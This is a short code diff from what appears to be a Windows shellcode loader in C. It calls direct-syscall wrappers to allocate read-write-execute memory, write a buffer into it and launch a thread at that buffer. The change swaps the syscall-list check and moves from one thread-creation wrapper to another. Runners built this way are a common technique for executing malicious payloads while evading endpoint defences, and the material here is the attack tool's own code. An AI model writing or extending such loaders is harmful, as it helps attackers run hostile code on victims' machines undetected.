@@ -44,7 +44,7 @@ int main()
 
 	WzDInit();
 
-	if ( !pSyscallList )
+	if ( !SYSCALL_LIST_NAME )
 		return;
 
 	if ( ( Status = WzDAllocateVirtualMemory( ( HANDLE )-1, &pShellcode, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) != NT_SUCCESS )
@@ -63,7 +63,7 @@ int main()
 	
 	print( "Wrote %zu bytes to buffer", Size );
 
-	if ( ( Status = WzDCreateThread( &hThread, THREAD_ALL_ACCESS, 0, ( HANDLE )-1, ( LPTHREAD_START_ROUTINE )pShellcode, 0, 0, 0, 0, 0, 0 ) ) != NT_SUCCESS )
+	if ( ( Status = WzDCreateThreadEx( &hThread, THREAD_ALL_ACCESS, 0, ( HANDLE )-1, ( LPTHREAD_START_ROUTINE )pShellcode, 0, 0, 0, 0, 0, 0 ) ) != NT_SUCCESS )
 	{
 		print( "NtCreateThreadEx failed with error: 0x%0.8X", Status );
 		return -1;
